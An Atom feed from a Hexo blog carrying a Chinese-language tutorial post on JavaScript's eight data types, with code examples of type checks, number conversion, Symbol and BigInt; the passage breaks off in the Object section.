<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Aiolimp</title>
  
  
  <link href="http://aiolimp.com/atom.xml" rel="self"/>
  
  <link href="http://aiolimp.com/"/>
  <updated>2023-03-05T13:32:12.207Z</updated>
  <id>http://aiolimp.com/</id>
  
  <author>
    <name>Aiolimp</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JavaScript数据类型</title>
    <link href="http://aiolimp.com/2023/03/05/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>http://aiolimp.com/2023/03/05/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</id>
    <published>2023-03-05T13:32:12.207Z</published>
    <updated>2023-03-05T13:32:12.207Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JavaScript数据类型"><a href="#JavaScript数据类型" class="headerlink" title="JavaScript数据类型"></a>JavaScript数据类型</h2><p>JavaScript一共有8种数据类型，其中有7种基本数据类型：Undefined、Null、Boolean、Number、String、Symbol（es6新增，表示独一无二的值）和BigInt（es10新增）；</p><p>1种引用数据类型——Object（Object本质上是由一组无序的名值对组成的）。里面包含 function、Array、Date等。JavaScript不支持任何创建自定义类型的机制，而所有值最终都将是上述 8 种数据类型之一。</p><p>原始数据类型：直接存储在<strong>栈</strong>（stack）中，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储。</p><p>引用数据类型：同时存储在<strong>栈</strong>（stack）和<strong>堆</strong>（heap）中，占据空间大、大小不固定。引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体。</p><h3 id="1、-Undefined类型"><a href="#1、-Undefined类型" class="headerlink" title="1、 Undefined类型"></a>1、 Undefined类型</h3><p><code>Undefined</code>类型只有一个值，即特殊的<code>undefined</code>，一个变量在声明后未初始化时，这个变量的值就是<code>undefined</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message;</span><br><span class="line">alert(message);<span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>需要注意的是声明了但未初始化的变量与未声明的变量是不一样的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> msg;</span><br><span class="line">alert(msg);<span class="comment">// 声明了未初始化（即赋值），默认值为&quot;undefined&quot;</span></span><br><span class="line">alert(a);<span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>但使用<code>typeof</code>操作符来检测上面两个变量时，都会返回<code>undefined</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> msg;</span><br><span class="line"><span class="comment">// var a</span></span><br><span class="line">alert(<span class="keyword">typeof</span> msg);<span class="comment">// &quot;undefined&quot;</span></span><br><span class="line">alert( <span class="keyword">typeof</span> a);<span class="comment">// &quot;undefined&quot;</span></span><br></pre></td></tr></table></figure><p>这个结果有其逻辑上的合理性。因为虽然这两种变量从技术角度看有本质区别，但实际上无论对哪种变量也不可能执行真正的操作。</p><blockquote><p>未初始化的变量会自动被赋予 undefined 值，没有必要将变量显式的设置为<code>undefined</code>，但显式地初始化变量依然是明智的选择。如果能够做到这一点，那么当 <code>typeof</code> 操作符返回”undefined”值时，我们就知道被检测的变量还没有被声明，而不是尚未初始化。</p></blockquote><h3 id="2、Null类型"><a href="#2、Null类型" class="headerlink" title="2、Null类型"></a>2、Null类型</h3><p><code>Null</code> 类型是第二个只有一个值的数据类型，这个特殊的值是 <code>null</code>。<code>null</code> 值表示一个空对象指针，使用 <code>typeof</code> 操作符检测 null 值时会返回<code>&quot;object&quot;</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jake = <span class="literal">null</span>; </span><br><span class="line">alert(<span class="keyword">typeof</span> jake ); <span class="comment">// &quot;object&quot;</span></span><br></pre></td></tr></table></figure><p>虽然 <code>typeof null</code> 会输出 <code>object</code>，但这只是 <code>JS</code> 存在的一个悠久 <code>Bug</code>。在 <code>JS</code> 的最初版本中使用的是 32 位系统，为了性能考虑使用低位存储变量的类型信息，000 开头代表是对象然而 <code>null</code> 表示为全零，所以将它错误的判断为 <code>object</code> 。 <code>null</code>值的主要作用是如果定义的变量在将来用于保存对象，那么最好将该变量初始化为<code>null</code>值。</p><h3 id="3、Boolean类型"><a href="#3、Boolean类型" class="headerlink" title="3、Boolean类型"></a>3、Boolean类型</h3><p><code>Boolean</code>类型是<code>JavaScript</code>中使用最多的一种基本数据类型，只有两个值<code>true</code>和<code>false</code>（全为小写）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span>  a = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span>  b = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>虽然<code>Boolean</code>类型只有两个值，但<code>JavaScript</code>中所有类型的值都有与这两个<code>Boolean</code>值等价的值，可以调用转型函数<code>Boolean()</code>将其他类型的值转化为<code>Boolean</code>值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span>  msg = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="keyword">var</span>  magBoolean = <span class="built_in">Boolean</span>(msg);</span><br></pre></td></tr></table></figure><p>根据转换值的数据类型及其实际值，返回一个<code>Boolean</code>值。各种数据类型及其对应的转换规则如下表：</p><table><thead><tr><th>数据类型</th><th>转为true</th><th>转为false</th></tr></thead><tbody><tr><td>Boolean</td><td>true</td><td>false</td></tr><tr><td>String</td><td>任何非空字符串</td><td>“ “（空字符串）</td></tr><tr><td>Number</td><td>任何非零数字（包括无穷大）</td><td>0和NaN</td></tr><tr><td>Object</td><td>任何对象</td><td>null</td></tr><tr><td>Undefined</td><td>not applicable（不适用）</td><td>undefined</td></tr></tbody></table><h3 id="4、Number类型"><a href="#4、Number类型" class="headerlink" title="4、Number类型"></a>4、Number类型</h3><p><code>Number</code>类型算是<code>JavaScript</code>中最复杂也最令人关注的基本数据类型了，<code>Number</code>可以同时表示整数和浮点数值，同时也支持各种进制和科学计数法。具体如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> intNum = <span class="number">55</span>; <span class="comment">// 整数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数</span></span><br><span class="line"><span class="keyword">var</span> floatNum1 = <span class="number">1.1</span>; </span><br><span class="line"><span class="keyword">var</span> floatNum2 = <span class="number">0.1</span>; </span><br><span class="line"><span class="keyword">var</span> floatNum3 = <span class="number">.1</span>; <span class="comment">// 有效，但不推荐</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 科学计数法</span></span><br><span class="line"><span class="keyword">var</span> floatNum = <span class="number">3.125e7</span>; <span class="comment">// 等于 31250000 相当于 3.125*10的7次方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 八进制（以O开头),数字序列(0~7)</span></span><br><span class="line"><span class="keyword">var</span> octalNum1 = <span class="number">070</span>; <span class="comment">// 八进制的 56</span></span><br><span class="line"><span class="keyword">var</span> octalNum2 = <span class="number">079</span>; <span class="comment">// 无效的八进制数值——解析为 79</span></span><br><span class="line"><span class="keyword">var</span> octalNum3 = <span class="number">08</span>; <span class="comment">// 无效的八进制数值——解析为 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 十六进制(以Ox开头),数字序列(0~9及A~F)，字母大小写同等</span></span><br><span class="line"><span class="keyword">var</span> hexNum1 = <span class="number">0xA</span>; <span class="comment">// 十六进制的 10</span></span><br><span class="line"><span class="keyword">var</span> hexNum2 = <span class="number">0x1f</span>; <span class="comment">// 十六进制的 31</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>JavaScript</code>能够表示的最小数值保存在 <code>Number.MIN_VALUE</code> 中——在大多数浏览器中，这个值是 <code>5e-324</code>；能够表示的最大数值保存在<code>Number.MAX_VALUE</code> 中——在大多数浏览器中，这个值是 <code>1.7976931348623157e+308</code>。如果某次计算的结果得到了一个超出 <code>JavaScript</code> 数值范围的值，那么这个数值将被自动转换成特殊的 <code>Infinity</code> 值(有正负)。 这里要特别说明一下，浮点数值的最高精度是 17 位小数，但在进行算术计算时其精确度远远不如整数。例如，0.1 + 0.2的结果不是 0.3，而是 0.30000000000000004。这是因为0.1和0.2在转换成二进制后会无限循环，由于标准位数的限制后面多余的位数会被截掉，此时就已经出现了精度的损失，相加后因浮点数小数位的限制而截断的二进制数字在转换为十进制就会变成0000000000000004。所以上面提到的BigInt就应运而生。</p><blockquote><p>关于浮点数值计算会产生舍入误差的问题，有一点需要明确：这是使用基于IEEE754 数值的浮点计算的通病，ECMAScript 并非独此一家；其他使用相同数值格式的语言也存在这个问题。</p></blockquote><h4 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h4><p><code>NaN（Not a Number)</code>，即非数值，用于表示一个本来要返回数值的操作数未返回数值的情况。 <code>NaN</code>有两个非同寻常的特点：</p><ol><li>任何涉及<code>NaN</code>的操作(例如<code>NaN/10</code>)都会返回<code>NaN</code>；</li><li><code>NaN</code>与任何值都不相等，包括<code>NaN</code>本身。</li></ol><p>针对这两个特点，<code>JavaScript</code>定义了<code>isNaN()</code>函数。这个函数接受一个参数，该参数可以是任何类型。<code>isNaN()</code>在接收到一个值后，会尝试将这个值转换为数值，而任何不能被转换为数值的值都会导致函数返回<code>true</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">isNaN</span>(<span class="literal">NaN</span>)); <span class="comment">//true </span></span><br><span class="line">alert(<span class="built_in">isNaN</span>(<span class="number">10</span>)); <span class="comment">//false（10 是一个数值）</span></span><br><span class="line">alert(<span class="built_in">isNaN</span>(<span class="string">&quot;10&quot;</span>)); <span class="comment">//false（可以被转换成数值 10）</span></span><br><span class="line">alert(<span class="built_in">isNaN</span>(<span class="string">&quot;blue&quot;</span>)); <span class="comment">//true（不能转换成数值）</span></span><br><span class="line">alert(<span class="built_in">isNaN</span>(<span class="literal">true</span>)); <span class="comment">//false（可以被转换成数值 1）</span></span><br></pre></td></tr></table></figure><h4 id="数值转换"><a href="#数值转换" class="headerlink" title="数值转换"></a>数值转换</h4><p><code>JavaScript</code>提供3个函数可以把非数值转换为数值：</p><ul><li><code>Number()</code>可以用于任何数据类型</li><li><code>parseInt()</code>和<code>parseFloat()</code>专门用于把字符串转换为数值</li></ul><p><strong>Number()</strong> <code>Number()</code>函数的转换规则很多，这里直接引用红宝书里的描述：</p><blockquote><p>如果是 Boolean 值，true 和 false 将分别被转换为 1 和 0。</p><p>如果是数字值，只是简单的传入和返回。</p><p>如果是 null 值，返回 0。  如果是 undefined，返回 NaN。</p><p>如果是字符串，遵循下列规则：</p><p>a、中只包含数字（包括前面带正号或负号的情况），则将其转换为十进制数值，即”1” 会变成 1，”123”会变成 123，而”011”会变成 11（注意：前导的零被忽略了）；</p><p>b、串中包含有效的浮点格式，如”1.1”，则将其转换为对应的浮点数值（同样，也会忽 略前导零）；</p><p>c、字符串中包含有效的十六进制格式，例如”0xf”，则将其转换为相同大小的十进制整 数值；</p><p>d、字符串是空的（不包含任何字符），则将其转换为 0；  如果字符串中包含除上述格式之外的字符，则将其转换为 NaN。</p><p>如果是对象，则调用对象的 valueOf()方法，然后依照前面的规则转换返回的值。如果转换 的结果是 NaN，则调用对象的 toString()方法，然后再次依照前面的规则转换返回的字符 串值。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 = <span class="built_in">Number</span>(<span class="string">&quot;Hello world!&quot;</span>); <span class="comment">//NaN </span></span><br><span class="line"><span class="keyword">var</span> num2 = <span class="built_in">Number</span>(<span class="string">&quot;&quot;</span>); <span class="comment">//0 </span></span><br><span class="line"><span class="keyword">var</span> num3 = <span class="built_in">Number</span>(<span class="string">&quot;000011&quot;</span>); <span class="comment">//11 </span></span><br><span class="line"><span class="keyword">var</span> num4 = <span class="built_in">Number</span>(<span class="literal">true</span>); <span class="comment">//1 </span></span><br><span class="line">NumberExample04.html</span><br></pre></td></tr></table></figure><p><strong>parseInt()</strong> <code>parseInt()</code>函数在转换字符串时，更多的是看其是否符合数值模式。它会忽略字 符串前面的空格，直至找到第一个非空格字符。如果第一个字符不是数字字符或者负号，<code>parseInt()</code> 就会返回 <code>NaN</code>；也就是说，用 <code>parseInt()</code>转换空字符串会返回 <code>NaN</code>（<code>Number()</code>对空字符返回 <code>0</code>）。如 果第一个字符是数字字符，<code>parseInt()</code>会继续解析第二个字符，直到解析完所有后续字符或者遇到了 一个非数字字符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 = <span class="built_in">parseInt</span>(<span class="string">&quot;1234blue&quot;</span>); <span class="comment">// 1234 </span></span><br><span class="line"><span class="keyword">var</span> num2 = <span class="built_in">parseInt</span>(<span class="string">&quot;&quot;</span>); <span class="comment">// NaN </span></span><br><span class="line"><span class="keyword">var</span> num3 = <span class="built_in">parseInt</span>(<span class="string">&quot;0xA&quot;</span>); <span class="comment">// 10（十六进制数）</span></span><br><span class="line"><span class="keyword">var</span> num4 = <span class="built_in">parseInt</span>(<span class="number">22.5</span>); <span class="comment">// 22 </span></span><br><span class="line"><span class="keyword">var</span> num5 = <span class="built_in">parseInt</span>(<span class="string">&quot;070&quot;</span>); <span class="comment">// 56（八进制数）</span></span><br><span class="line"><span class="keyword">var</span> num6 = <span class="built_in">parseInt</span>(<span class="string">&quot;70&quot;</span>); <span class="comment">// 70（十进制数）</span></span><br><span class="line"><span class="keyword">var</span> num7 = <span class="built_in">parseInt</span>(<span class="string">&quot;0xf&quot;</span>); <span class="comment">// 15（十六进制数）</span></span><br></pre></td></tr></table></figure><p>在使用 <code>parseInt()</code>解析像八进制字面量的字符串时，<code>ECMAScript 3</code> 和 <code>5</code> 存在分歧。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ECMAScript 3 认为是 56（八进制），ECMAScript 5 认为是 70（十进制）</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="built_in">parseInt</span>(<span class="string">&quot;070&quot;</span>);</span><br></pre></td></tr></table></figure><p>因此<code>parseInt()</code>引入第二个参数：转换时使用的基数，以解决上述困惑。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 = <span class="built_in">parseInt</span>(<span class="string">&quot;10&quot;</span>, <span class="number">2</span>); <span class="comment">//2 （按二进制解析）</span></span><br><span class="line"><span class="keyword">var</span> num2 = <span class="built_in">parseInt</span>(<span class="string">&quot;10&quot;</span>, <span class="number">8</span>); <span class="comment">//8 （按八进制解析）</span></span><br><span class="line"><span class="keyword">var</span> num3 = <span class="built_in">parseInt</span>(<span class="string">&quot;10&quot;</span>, <span class="number">10</span>); <span class="comment">//10 （按十进制解析）</span></span><br><span class="line"><span class="keyword">var</span> num4 = <span class="built_in">parseInt</span>(<span class="string">&quot;10&quot;</span>, <span class="number">16</span>); <span class="comment">//16 （按十六进制解析）</span></span><br></pre></td></tr></table></figure><p><strong>parseFloat()</strong> 与 <code>parseInt()</code>函数类似，<code>parseFloat()</code>也是从第一个字符（位置 0）开始解析每个字符。而且也是一直解析到字符串末尾，或者解析到遇见一个无效的浮点数字字符为止。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 = <span class="built_in">parseFloat</span>(<span class="string">&quot;1234blue&quot;</span>); <span class="comment">//1234 （整数）</span></span><br><span class="line"><span class="keyword">var</span> num2 = <span class="built_in">parseFloat</span>(<span class="string">&quot;0xA&quot;</span>); <span class="comment">//0 </span></span><br><span class="line"><span class="keyword">var</span> num3 = <span class="built_in">parseFloat</span>(<span class="string">&quot;22.5&quot;</span>); <span class="comment">//22.5 </span></span><br><span class="line"><span class="keyword">var</span> num4 = <span class="built_in">parseFloat</span>(<span class="string">&quot;22.34.5&quot;</span>); <span class="comment">//22.34 第二个小数点无效</span></span><br><span class="line"><span class="keyword">var</span> num5 = <span class="built_in">parseFloat</span>(<span class="string">&quot;0908.5&quot;</span>); <span class="comment">//908.5 </span></span><br><span class="line"><span class="keyword">var</span> num6 = <span class="built_in">parseFloat</span>(<span class="string">&quot;3.125e7&quot;</span>); <span class="comment">//31250000</span></span><br></pre></td></tr></table></figure><h3 id="5、String类型"><a href="#5、String类型" class="headerlink" title="5、String类型"></a>5、String类型</h3><p><code>String</code>，即字符串，由一对双引号或单引号表示(单双引号没有区别)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> firstName = <span class="string">&quot;Jake&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> lastName = <span class="string">&#x27;JakeZhang&#x27;</span>;</span><br></pre></td></tr></table></figure><p><code>JavaScript</code>中的字符串是不可变的，也就是说，字符串一旦创建，它们的值就不能改变。要改变某个变量保存的字符串，首先要销毁原来的字符串，然后再用另一个包含新值的字符串填充该变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span>   name  = <span class="string">&quot;Jake&quot;</span>;</span><br><span class="line">name = name + <span class="string">&quot;Zhang&quot;</span>;</span><br></pre></td></tr></table></figure><p>实现这个操作的过程如下：首先创建一个能容纳 10 个字符的新字符串，然后在这个字符串中填充”Jake”和”Zhang”，最后一步是销毁原来的字符串”Jake”和字符串”Zhang”，因为这两个字符串已经没用了(这个过程是在后台发生的)。</p><p>实际开发中经常为方便存储，经常需要将值转换为字符串。要把一个值转换为一个字符串有两种方式：</p><p><strong>1、toString()</strong> 除了<code>null</code>和<code>undefined</code>值没有<code>tostring()</code>方法，其他值都有这个方法，该方法返回字符串的一个副本。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">11</span>; </span><br><span class="line"><span class="keyword">var</span> ageAsString = age.toString(); <span class="comment">// 字符串&quot;11&quot; </span></span><br><span class="line"><span class="keyword">var</span> found = <span class="literal">true</span>; </span><br><span class="line"><span class="keyword">var</span> foundAsString = found.toString(); <span class="comment">// 字符串&quot;true&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>toString()</code>可以传入一个参数：输出数值的基数。可以输出以二进制、八进制、十六进制，乃至其他任意有效进制格式表示的字符串值。下面给出几个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>; </span><br><span class="line">alert(num.toString()); <span class="comment">// &quot;10&quot; </span></span><br><span class="line">alert(num.toString(<span class="number">2</span>)); <span class="comment">// &quot;1010&quot; </span></span><br><span class="line">alert(num.toString(<span class="number">8</span>)); <span class="comment">// &quot;12&quot; </span></span><br><span class="line">alert(num.toString(<span class="number">10</span>)); <span class="comment">// &quot;10&quot; </span></span><br><span class="line">alert(num.toString(<span class="number">16</span>)); <span class="comment">// &quot;a&quot;</span></span><br></pre></td></tr></table></figure><p><strong>2、使用+”  “</strong> 即可以通过**要转换的值 + 空字符串(“  “)**，也可以实现转换。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> numAsString = num + <span class="string">&quot; &quot;</span>;<span class="comment">// &quot;10&quot;</span></span><br><span class="line"><span class="keyword">var</span> boolean = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> booleanAsString = boolean + <span class="string">&quot; &quot;</span>;<span class="comment">// &quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a ;</span><br><span class="line"><span class="keyword">var</span> b = a + <span class="string">&quot; &quot;</span>;<span class="comment">// &quot;undefined &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> d = c + <span class="string">&quot; &quot;</span>;<span class="comment">// &quot;null &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">   valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">&#125; </span><br><span class="line"> <span class="keyword">var</span> m = o + <span class="string">&quot; &quot;</span>;<span class="comment">// &quot;-1 &quot;</span></span><br></pre></td></tr></table></figure><h3 id="6、Symbol"><a href="#6、Symbol" class="headerlink" title="6、Symbol"></a>6、Symbol</h3><p><code>Symbol</code>是<code>es6</code>新增的一种原始数据类型，表示独一无二的值，是一种唯一标识符。<code>Symbol</code>值通过<code>Symbol()</code>函数生成。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="built_in">Symbol</span>(<span class="string">&quot;jake&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>Symbol</code>的主要特点是如上所说的唯一性，可用作对象的唯一属性名，即使是用同一个变量生成的值也不相等。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> id1 = <span class="built_in">Symbol</span>(<span class="string">&#x27;jake&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> id2 = <span class="built_in">Symbol</span>(<span class="string">&#x27;jake&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(id1 == id2);  <span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>但我们不排除希望能够多次使用同一个<code>symbol</code>值的情况。官方提供的<code>Symbol.for()</code>方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 <code>Symbol</code> 值。如果有，就返回这个 <code>Symbol</code> 值，否则就新建一个以该字符串为名称的 <code>Symbol</code> 值，并将其注册到全局。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name1 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;name&#x27;</span>); <span class="comment">//检测到未创建后新建</span></span><br><span class="line"><span class="keyword">let</span> name2 = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;name&#x27;</span>); <span class="comment">//检测到已创建后返回</span></span><br><span class="line"><span class="built_in">console</span>.log(name1 === name2); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p><code>Symbol</code>的另一特点是隐藏性，<code>Symbol</code> 作为属性名，遍历对象的时候，该属性不会出现在<code>for...in、for...of</code>循环中，也不会被<code>Object.keys()</code>、<code>Object.getOwnPropertyNames()</code>、<code>JSON.stringify()</code>返回。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="built_in">Symbol</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line"> [id]:<span class="string">&#x27;symbol&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> option <span class="keyword">in</span> obj)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(obj[option]); <span class="comment">//空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是也有能够访问的方法：<code>Object.getOwnPropertySymbols</code> 该方法会返回一个数组，成员是当前对象的所有用作属性名的<code>Symbol</code>值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">let</span> id = <span class="built_in">Symbol</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"> <span class="keyword">let</span> obj = &#123;</span><br><span class="line">  [id]:<span class="string">&#x27;symbol&#x27;</span></span><br><span class="line"> &#125;;</span><br><span class="line"><span class="keyword">let</span> array = <span class="built_in">Object</span>.getOwnPropertySymbols(obj);</span><br><span class="line"> <span class="built_in">console</span>.log(array); <span class="comment">//[Symbol(id)]</span></span><br><span class="line"> <span class="built_in">console</span>.log(obj[array[<span class="number">0</span>]]);  <span class="comment">//&#x27;symbol&#x27;</span></span><br></pre></td></tr></table></figure><p>关于<code>Symbol</code>这个新的数据类型更多的知识点可以参考阮神的文章—&gt;<a href="https://link.juejin.cn/?target=http://es6.ruanyifeng.com/%23docs/symbol">传送门</a></p><h3 id="7、BigInt类型"><a href="#7、BigInt类型" class="headerlink" title="7、BigInt类型"></a>7、BigInt类型</h3><blockquote><p><code>BigInt</code>是什么? <code>BigInt</code>是<code>JavaScript</code>中一种可以用来表示任意精度整数的基本数据类型</p><p><code>BigInt</code>可以用来表示任意精度整数的特性为<code>JavaScript</code>解锁了更多的骚操作，使用<code>BigInt</code>可以告别过去因为整数运算导致溢出的痛苦。特别是金融方面因为涉及大量的数据运算，比如高精度时间戳，或者数值过大的ID，这些是无法安全的用Number类型去存储的，所以退而求其次使用String类型去存储，有了BigInt类型后就可以安全的将其存储为数值类型。</p><p>另外<code>BigInt</code>的实现也为实现<code>BigDecimal</code>打下坚实基础，那将对于以十进制精度表示货币金额并对其进行精确运算（也就是0.10 + 0.20 !== 0.30问题）非常有帮助</p></blockquote><h3 id="8、引用数据类型——Object类型"><a href="#8、引用数据类型——Object类型" class="headerlink" title="8、引用数据类型——Object类型"></a>8、引用数据类型——Object类型</h3><p><code>Object</code>类型是<code>JavaScript</code>中最庞大而复杂的引用数据类型，本文只做简单介绍，后续的文章会做<code>Object</code>的详细介绍。 <code>Object</code>，即对象，是一组数据和功能的集合。对象可以通过执行<code>new</code>操作符后跟要创建 的对象类型的名称来创建。而创建 <code>Object</code> 类型的实例并为其添加属性和（或）方法，就可以创建自定 义对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="built_in">Object</span>(); </span><br><span class="line">person.name = <span class="string">&quot;Jake&quot;</span>; </span><br><span class="line">person.age = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = &#123;&#125;; <span class="comment">//与 new Object()相同</span></span><br><span class="line">person2.name = <span class="string">&quot;Jake&quot;</span>; </span><br><span 